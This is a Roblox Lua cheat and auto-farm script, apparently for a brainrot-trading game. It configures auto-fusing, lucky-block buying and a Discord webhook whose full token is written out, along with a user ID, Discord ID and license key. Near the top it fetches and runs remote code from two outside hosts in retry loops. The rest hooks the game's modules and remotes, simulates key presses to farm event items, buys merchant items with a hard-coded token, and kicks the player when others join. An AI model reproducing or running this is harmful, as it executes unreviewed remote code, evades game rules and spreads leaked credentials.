spawn(function()
    _G.Config={UserID="af98f8db-b72a-41ad-bfec-3f4182bc93e6",discord_id="1065861794494689402",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/sab"))()end)if s then break end wait(5)end
end)

spawn(function()
    while task.wait(1) do
        setfpscap(8)
    end
end)

getgenv().Key = "k848a5227cffb8c1f16c72b2"
getgenv().Config = {
    ["Gameplay"] = {
        ["Server Type"] = "Private (Clone)",
        ["Collect Cash Cap"] = "1000B",
        ["Max Auctioning Multiplier"] = 10,
        ["Lock Base Extra Time"] = 5,
    },
    ["Misc"] = {
        ["Kick if Ping above"] = 5000,
        ["Kick if FPS below"] = 1,
        ["Ignore Secret"] = {
            ["La Vacca Saturno Saturnita"] = { "All" },
            ["Karkerkar Kurkur"] = { "All" },
            ["Sammyni Spyderini"] = { "All" },
            ["Extinct Tralalero"] = { "All" },
            ["Extinct Matteo"] = { "All" },
            ["Dul Dul Dul"] = { "All" },
            ["Chachechi"] = { "All" },
            ["Los Tralaleritos"] = { "All" },
            ["Las Tralaleritas"] = { "All" },
            ["La Cucaracha"] = { "All" },
            ["Job Job Job Sahur"] = { "All" },
            ["Frankentteo"] = { "All" },
            ["Graipuss Medussi"] = { "All" },
            ["Zombie Tralala"] = { "All" },
            ["Perrito Burrito"] = { "All" },
            ["To to to Sahur"] = { "All" },
            ["Guerriro Digitale"] = { "All" },
            ["Coffin Tung Tung Tung Sahur"] = { "All" },
            ["Nooo My Hotspot"] = { "All" },
            ["La Grande Combinasion"] = { "All" },
            ["Chicleteira Bicicleteira"] = { "All" },
        },
        ["Auto Fuse"] = {
            ["Enable"] = true,
            ["Fuse Animal"] = {
                ["La Vacca Saturno Saturnita"] = { "All" },
                ["Chachechi"] = { "All" },
                ["Chicleteira Bicicleteira"] = { "All" },
                ["Dul Dul Dul"] = { "All" },
                ["Graipuss Medussi"] = { "All" },
                ["Jackorilla"] = { "All" },
                ["Job Job Job Sahur"] = { "All" },
                ["Guerriro Digitale"] = { "All" },
                ["Karkerkar Kurkur"] = { "All" },
                ["La Cucaracha"] = { "All" },
                ["La Grande Combinasion"] = { "All" },
                ["Las Tralaleritas"] = { "All" },
                ["Los 25"] = { "All" },
                ["Los Combinasionas"] = { "All" },
                ["Los Jobcitos"] = { "All" },
                ["Los Tortus"] = { "All" },
                ["Pumpkini Spyderini"] = { "All" },
                ["Sammyni Spyderini"] = { "All" },
                ["Santa Hotspot"] = { "All" },
                ["Telemorte"] = { "All" },
                ["To to to Sahur"] = { "All" },
                ["Trickolino"] = { "All" },
                ["Triplito Tralaleritos"] = { "All" },
                ["Zombie Tralala"] = { "All" },
                ["Chimnino"] = { "All" },
                ["Bunnyman"] = { "All" },
                ["Please my Present"] = { "All" },
                ["Reindeer Tralala"] = { "All" },
                ["La Vacca Prese Presente"] = { "All" },
            },
        },
        ["Rare Animal Generation"] = "20M",
        ["Open Lucky Block"] = {
            "Admin Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Festive Lucky Block",
        },
        ["Buy Lucky Block"] = {
            "Admin Lucky Block",
            "Secret Lucky Block",
            "Festive Lucky Block",
            "Spooky Lucky Block",
            "Los Lucky Blocks",
        },
    },
    ["Performance"] = {
        ["Boost FPS"] = true,
        ["Black Screen"] = true,
    },
    ["Webhook"] = {
        ["Enable"] = true,
        ["Url"] = "https://discord.com/api/webhooks/1417865473567101069/QZZ0Zql6Y95jct0KQMAQYzxYgmzPexssStT7SQzR6zxatgtNqhGod2FD3HdBOrmAt_TH",
        ["Ignore Notify"] = {},
    }
}
spawn(function()
    task.wait(200)
    if not getgenv().scriptLoaded then
        game.Players.LocalPlayer:Kick("Script load timeout\nKick to prevent animal gets stolen")
    end
end)
repeat
    wait()
    spawn(function()
        loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
    end)
    wait(20)
until getgenv().Joebiden

-- delete
spawn(function()
    task.wait(10)
    pcall(function()
        local userSettings = UserSettings():GetService("UserGameSettings")
        userSettings.SavedQualityLevel = 1
        userSettings.MasterVolume = 0
    end)

    repeat task.wait(0.3) until game:IsLoaded()
    task.wait(0.5)

    local Players = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local Lighting = game:GetService("Lighting")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local StarterGui = game:GetService("StarterGui")
    local CollectionService = game:GetService("CollectionService")
    local lp = Players.LocalPlayer

    if not lp then
        warn("LocalPlayer not found!")
        return
    end


    local randomDelay = math.random(0, 200) / 100
    task.wait(randomDelay)

    -- Remove event-like objects and VFX in workspace
    task.spawn(function()
        task.wait(0.2)

        pcall(function()
            local eventsFolder = Workspace:FindFirstChild("Events")
            if eventsFolder then
                eventsFolder:Destroy()
            end
        end)

        for _, obj in ipairs(Workspace:GetDescendants()) do
            pcall(function()
                local name = obj.Name:lower()
                if name:find("event") or name:find("stage") or name:find("ufo") or
                name:find("meteor") or name:find("shark") or name:find("cave") or
                name:find("bloodmoon") or name:find("candy") or name:find("molten") or
                name:find("nyan") or name:find("radioactive") or name:find("rainbow") then
                    obj:Destroy()
                end
            end)
        end

        for _, tag in ipairs(CollectionService:GetAllTags()) do
            pcall(function()
                local tlower = tag:lower()
                if tlower:find("event") or tlower:find("galaxy") or
                tlower:find("trick") or tlower:find("witching") or
                tlower:find("water") or tlower:find("sammyni") then
                    for _, obj in ipairs(CollectionService:GetTagged(tag)) do
                        pcall(function() obj:Destroy() end)
                    end
                end
            end)
        end

        for _, obj in ipairs(Workspace:GetDescendants()) do
            pcall(function()
                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
                    obj.Enabled = false
                    obj:Destroy()
                end
            end)
        end
    end)

    -- Lighting & graphics cleanup
    pcall(function()
        Lighting.Technology = Enum.Technology.Compatibility
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 0
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

        for _, obj in ipairs(Lighting:GetChildren()) do
            if not obj:IsA("Script") and not obj:IsA("LocalScript") and not obj:IsA("ModuleScript") then
                pcall(function() obj:Destroy() end)
            end
        end
    end)

    -- MaterialService cleanup
    pcall(function()
        for _, obj in ipairs(game:GetService("MaterialService"):GetChildren()) do
            pcall(function() obj:Destroy() end)
        end
    end)

    -- Disable a lot of particle lifetimes (bounded)
    task.spawn(function()
        local processed = 0
        local maxProcess = 500

        for _, v in ipairs(Workspace:GetDescendants()) do
            if processed >= maxProcess then break end

            pcall(function()
                if v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                    processed = processed + 1
                elseif v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
                    v.Enabled = false
                    processed = processed + 1
                end
            end)

            if processed % 100 == 0 then task.wait() end
        end
    end)

    -- Delete specific folders/objects and clear replicated storage VFX/sounds
    task.spawn(function()
        task.wait(0.3)

        local function clearFolder(parent, name)
            pcall(function()
                local folder = parent:FindFirstChild(name)
                if folder then
                    for _, child in ipairs(folder:GetChildren()) do
                        pcall(function() child:Destroy() end)
                    end
                end
            end)
        end

        local function deleteObj(parent, name)
            pcall(function()
                local obj = parent:FindFirstChild(name)
                if obj then obj:Destroy() end
            end)
        end

        for _, name in ipairs({"RoadPanel", "Shop", "RobuxShop", "Sounds", "WrappedMachine", "EventBoard", "BrainrotTrader", "AdminBoard", "AdventCalendar", "ShopNPCRobuxIdle"}) do
            deleteObj(Workspace, name)
        end

        clearFolder(ReplicatedStorage, "Sounds")
        clearFolder(ReplicatedStorage, "Vfx")

        pcall(function()
            local models = ReplicatedStorage:FindFirstChild("Models")
            if models then
                local events = models:FindFirstChild("Events")
                if events then
                    for _, child in ipairs(events:GetChildren()) do
                        pcall(function() child:Destroy() end)
                    end
                end
            end
        end)
    end)

    -- Disable core GUI and camera effects
    task.spawn(function()
        task.wait(0.5)

        for _, guiType in ipairs({
            Enum.CoreGuiType.PlayerList,
            Enum.CoreGuiType.Health,
            Enum.CoreGuiType.Backpack,
            Enum.CoreGuiType.Chat,
            Enum.CoreGuiType.EmotesMenu,
        }) do
            pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
        end

        pcall(function()
            local camera = Workspace.CurrentCamera
            if camera then
                for _, effect in ipairs(camera:GetChildren()) do
                    if effect:IsA("BlurEffect") or effect:IsA("ColorCorrectionEffect") or
                    effect:IsA("SunRaysEffect") or effect:IsA("BloomEffect") or
                    effect:IsA("DepthOfFieldEffect") then
                        pcall(function() effect:Destroy() end)
                    end
                end
            end
        end)
    end)

    -- Hook EventController and remove event modules/sounds/models
    task.spawn(function()
        task.wait(0.3)

        pcall(function()
            if ReplicatedStorage:FindFirstChild("Controllers") then
                local ok, EventController = pcall(function()
                    return require(ReplicatedStorage.Controllers.EventController)
                end)
                if ok and EventController then
                    EventController.GetActiveEventData = function() return nil end
                    if EventController.OnStart then EventController.OnStart = function() end end
                end
            end
        end)

        pcall(function()
            local eventsFolder = ReplicatedStorage:FindFirstChild("Controllers")
            if eventsFolder then
                eventsFolder = eventsFolder:FindFirstChild("EventController")
                if eventsFolder then
                    for _, module in ipairs(eventsFolder:GetChildren()) do
                        if module:IsA("ModuleScript") then
                            pcall(function()
                                local success, eventModule = pcall(function() return require(module) end)
                                if success and eventModule then
                                    eventModule.OnStart = function() end
                                    eventModule.OnLoad = function() end
                                    eventModule.OnStop = function() end
                                end
                            end)
                        end
                    end
                end
            end
        end)

        pcall(function()
            local sounds = ReplicatedStorage:FindFirstChild("Sounds")
            if sounds then
                local events = sounds:FindFirstChild("Events")
                if events then events:Destroy() end
            end
        end)

        pcall(function()
            local models = ReplicatedStorage:FindFirstChild("Models")
            if models then
                local events = models:FindFirstChild("Events")
                if events then events:Destroy() end
            end
        end)
    end)

    -- Event cleanup on Lighting child added
    local lastEventCleanup = 0
    local eventCleanupCooldown = 0.05

    Lighting.ChildAdded:Connect(function(child)
        if tick() - lastEventCleanup < eventCleanupCooldown then return end
        task.spawn(function()
            pcall(function()
                if not child:IsA("Script") and not child:IsA("LocalScript") and not child:IsA("ModuleScript") then
                    child:Destroy()
                    lastEventCleanup = tick()
                end
            end)
        end)
    end)

    -- Workspace child added: remove event-like objects
    Workspace.ChildAdded:Connect(function(child)
        if tick() - lastEventCleanup < eventCleanupCooldown then return end
        task.spawn(function()
            pcall(function()
                local name = child.Name:lower()

                local eventKeywords = {
                    "event", "stage", "cave", "web", "bush", "crater", "meteor",
                    "ufo", "shark", "tung", "sammyni", "pumpkin", "cannon", "orb",
                    "lightning", "star", "confetti", "firework", "celebration",
                    "weather", "vfx", "effect", "burst", "explosion", "particle",
                    "beam", "trail", "emit", "glow", "flash", "sparkle",
                    "bloodmoon", "candy", "molten", "nyan", "radioactive", "rainbow",
                    "solar", "flare", "starfall", "strawberry", "trick", "treat",
                    "witching", "yin", "yang", "water", "snow", "glitch", "extinct",
                    "rap", "concert", "sammy", "mygame", "orcalero", "tralalero"
                }

                for _, keyword in ipairs(eventKeywords) do
                    if name:find(keyword) then
                        child:Destroy()
                        lastEventCleanup = tick()
                        return
                    end
                end

                if child:FindFirstChildOfClass("ParticleEmitter", true) or
                child:FindFirstChildOfClass("Beam", true) or
                child:FindFirstChildOfClass("Trail", true) then
                    child:Destroy()
                    lastEventCleanup = tick()
                end
            end)
        end)
    end)

    -- Additional attribute and module cleanup
    task.spawn(function()
        task.wait(0.5)

        pcall(function()
            for attr, _ in pairs(ReplicatedStorage:GetAttributes()) do
                if attr:lower():find("event") then
                    ReplicatedStorage:SetAttribute(attr, nil)
                end
            end
        end)

        ReplicatedStorage.AttributeChanged:Connect(function(attr)
            task.spawn(function()
                pcall(function()
                    if attr:lower():find("event") then
                        ReplicatedStorage:SetAttribute(attr, nil)
                    end
                end)
            end)
        end)
    end)

    local lastCleanup = tick()
    local cleanupCooldown = 0.1

    -- Another workspace ChildAdded listener for more conservative cleanup
    Workspace.ChildAdded:Connect(function(child)
        local now = tick()
        if now - lastCleanup < cleanupCooldown then return end

        task.spawn(function()
            pcall(function()
                local name = child.Name:lower()

                local isProtected = name:find("name") or name:find("tag") or
                                name:find("label") or name:find("billboard") or
                                child:IsA("BillboardGui")

                if not isProtected then
                    local keywords = {"tung", "event", "effect", "celebration", "particle", "confetti", "firework"}

                    for _, keyword in ipairs(keywords) do
                        if name:find(keyword) then
                            child:Destroy()
                            lastCleanup = now
                            return
                        end
                    end

                    if child:FindFirstChildOfClass("ParticleEmitter") then
                        child:Destroy()
                        lastCleanup = now
                    end
                end
            end)
        end)
    end)

    -- Override VFX table functions
    pcall(function()
        local success, VFX = pcall(function() return require(ReplicatedStorage.Shared.VFX) end)
        if success and VFX then
            for key, value in pairs(VFX) do
                if type(value) == "function" then
                    VFX[key] = function() end
                end
            end
        end
    end)

    -- Instance.new hooking to block certain classes
    pcall(function()
        local originalNew = Instance.new
        Instance.new = function(className, parent)
            pcall(function()
                if className == "ParticleEmitter" or className == "Trail" or
                className == "Fire" or className == "Smoke" or className == "Sparkles" or
                className == "Explosion" or className == "BloomEffect" or className == "BlurEffect" then
                    local fake = originalNew("Folder")
                    fake.Name = "Blocked_" .. className
                    return fake
                end
            end)
            return originalNew(className, parent)
        end
    end)

    -- Require hooking and other module protections
    task.spawn(function()
        task.wait(0.3)

        local originalRequire = require

        require = function(module)
            local result = originalRequire(module)

            pcall(function()
                -- FIXED: remove the invalid "module:IsA" check
                if module and typeof(module) == "Instance" and module:IsA("ModuleScript") and type(result) == "table" then

                    local parent = module.Parent
                    local name = string.lower(module.Name)

                    local isProtected =
                        name:find("ui") or
                        name:find("name") or
                        name:find("tag") or
                        name:find("label") or
                        name:find("billboard") or
                        name:find("overhead")

                    if not isProtected and parent and (parent.Name == "Effects" or parent.Name == "Events") then
                        for _, func in ipairs({"OnStart", "OnStop", "OnUpdate", "Activate", "OnLoad", "Start", "Execute"}) do
                            if result[func] then
                                result[func] = function() end
                            end
                        end
                    end
                end
            end)

            return result
        end
    end)


        -- Hook Net.RemoteEvent if available
        pcall(function()
            if ReplicatedStorage:FindFirstChild("Packages") and ReplicatedStorage.Packages:FindFirstChild("Net") then
                local ok, Net = pcall(function() return originalRequire(ReplicatedStorage.Packages.Net) end)
                if ok and Net and Net.RemoteEvent then
                    local originalRemoteEvent = Net.RemoteEvent
                    Net.RemoteEvent = function(remoteName)
                        local remote = originalRemoteEvent(remoteName)
                        if remoteName and (remoteName:find("SpawnEffect") or remoteName:find("Event") or remoteName:find("Effect") or remoteName:find("Celebration")) then
                            return {
                                OnClientEvent = {
                                    Connect = function() 
                                        return { Disconnect = function() end }
                                    end
                                },
                                FireServer = function() end
                            }
                        end
                        return remote
                    end
                end
            end
        end)
    -- Pre-require and patch controllers in ReplicatedStorage.Controllers
    pcall(function()
        local controllers = ReplicatedStorage:FindFirstChild("Controllers")
        if controllers then
            for _, controller in ipairs(controllers:GetChildren()) do
                if controller:IsA("ModuleScript") then
                    local name = controller.Name:lower()

                    local isProtected = name:find("ui")
                        or name:find("name")
                        or name:find("tag")
                        or name:find("label")

                    if not isProtected and (
                        name:find("effect")
                        or name:find("event")
                        or name:find("vfx")
                        or name:find("celebration")
                    ) then
                        
                        pcall(function()
                            local ok, mod = pcall(function()
                                return originalRequire(controller)
                            end)

                            if ok and type(mod) == "table" then
                                for key, value in pairs(mod) do
                                    if type(value) == "function" then
                                        mod[key] = function()
                                            return false
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end
            end
        end
    end) -- << THIS IS THE LAST LEGIT END

    -- Disable Christmas Spin Wheel
    task.spawn(function()
        task.wait(0.5)

        pcall(function()
            -- Destroy spin wheel objects in workspace
            for _, obj in ipairs(Workspace:GetDescendants()) do
                local name = obj.Name:lower()
                if name:find("christmas") and (name:find("wheel") or name:find("spin")) then
                    obj:Destroy()
                end
            end
        end)

        -- Hook the ChristmasSpinWheel controller
        pcall(function()
            local controllers = ReplicatedStorage:FindFirstChild("Controllers")
            if controllers then
                local wheelController = controllers:FindFirstChild("ChristmasSpinWheel")
                if wheelController then
                    local ok, mod = pcall(function()
                        return originalRequire(wheelController)
                    end)

                    if ok and type(mod) == "table" then
                        -- Disable all functions
                        mod.new = function() return {Destroy = function() end} end
                        mod.Destroy = function() end

                        -- Disable the constructor
                        if mod.__index then
                            for key, value in pairs(mod.__index) do
                                if type(value) == "function" then
                                    mod.__index[key] = function() end
                                end
                            end
                        end
                    end
                end
            end
        end)

        -- Prevent future spin wheel spawns
        Workspace.ChildAdded:Connect(function(child)
            task.spawn(function()
                pcall(function()
                    local name = child.Name:lower()
                    if name:find("christmas") and (name:find("wheel") or name:find("spin")) then
                        child:Destroy()
                    end
                end)
            end)
        end)
    end)
end)

-- event
spawn(function()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local player = Players.LocalPlayer

    local WAIT_TIME = 15
    local SPAM_DURATION = 60
    local totalElfsSeen = 0
    local activeSpamThread = nil
    local originalRequire = require
    local vim = game:GetService("VirtualInputManager")

    local function holdE(duration, elfNumber)
        -- Cancel any existing hold thread
        if activeSpamThread then
            task.cancel(activeSpamThread)
        end

        activeSpamThread = task.spawn(function()
            local startTime = os.clock()
            local endTime = startTime + duration
            local holdCycles = 0

            while os.clock() < endTime do
                vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                task.wait(1.2)
                vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                holdCycles = holdCycles + 1
                task.wait(0.2)
            end

            print("[Elf #" .. elfNumber .. "] " .. holdCycles .. " cycles")
            activeSpamThread = nil
            task.spawn(buySantaMerchantItem)
        end)
    end

    function buySantaMerchantItem()
        pcall(function()
            local Datas = ReplicatedStorage:WaitForChild("Datas", 5)
            if not Datas then return end
            local Shared = ReplicatedStorage:WaitForChild("Shared", 5)
            if not Shared then return end
            local Packages = ReplicatedStorage:WaitForChild("Packages", 5)
            if not Packages then return end

            local SantaMerchantData = require(Datas.SantaMerchantData)
            local Animals = require(Shared.Animals)
            local Net = require(Packages.Net)

            local function getGeneration(name)
                local s, g = pcall(function() return Animals:GetGeneration(name) end)
                return s and g or 0
            end

            local function getStock(name)
                return ReplicatedStorage:GetAttribute("SantaMerchant_" .. string.gsub(name, "%s", "_")) or 0
            end

            local best = nil
            local highestGen = 0

            for i, item in ipairs(SantaMerchantData.Brainrots) do
                local gen = getGeneration(item.Brainrot)
                local stock = getStock(item.Brainrot)
                if stock > 0 and gen > highestGen then
                    highestGen = gen
                    best = {Index = i, Name = item.Brainrot, Price = item.Price}
                end
            end

            if best then
                print("[Santa] " .. best.Name .. " (" .. best.Price .. " elves)")
                local remote = Net:RemoteFunction("SantaMerchantService/Buy")
                local s, r = pcall(function()
                    return remote:InvokeServer("2298b248-44dd-4a34-bbfe-e1174e8ae1b4", best.Index)
                end)
                if s and r then
                    print("[Santa] Bought " .. best.Name)
                end
            end
        end)
    end

    local function setupGoldElfDetection()
        local s, Net = pcall(function()
            return originalRequire(ReplicatedStorage.Packages.Net)
        end)
        if not s or not Net then return false end

        local s2, event = pcall(function()
            return Net:RemoteEvent("GameService/SpawnEffect")
        end)
        if not s2 or not event then return false end

        event.OnClientEvent:Connect(function(name, _, _, pos)
            if not name then return end
            local lower = string.lower(tostring(name))
            if not (string.find(lower, "gold", 1, true) and string.find(lower, "elf", 1, true)) then
                return
            end

            totalElfsSeen = totalElfsSeen + 1
            local num = totalElfsSeen

            local dist = "?"
            pcall(function()
                if pos and player.Character then
                    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local p = typeof(pos) == "CFrame" and pos.Position or pos
                        if typeof(p) == "Vector3" then
                            dist = math.floor((hrp.Position - p).Magnitude)
                        end
                    end
                end
            end)

            print("[Elf #" .. num .. "] " .. dist .. " studs - waiting " .. WAIT_TIME .. "s")

            task.spawn(function()
                task.wait(WAIT_TIME)
                holdE(SPAM_DURATION, num)
            end)
        end)

        return true
    end

    local start = os.clock()
    while not game:IsLoaded() and os.clock() - start < 30 do
        task.wait(0.5)
    end
    task.wait(1)

    if setupGoldElfDetection() then
        print("[Ready] Elf collector + Santa buyer")
    end
end)

-- kick
spawn(function()
    task.wait(100)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local function instantKick()
        if #Players:GetPlayers() > 1 then
            LocalPlayer:Kick("CÚT")
        end
    end

    instantKick()
    Players.PlayerAdded:Connect(instantKick)
    game:GetService("RunService").Heartbeat:Connect(instantKick)

end)






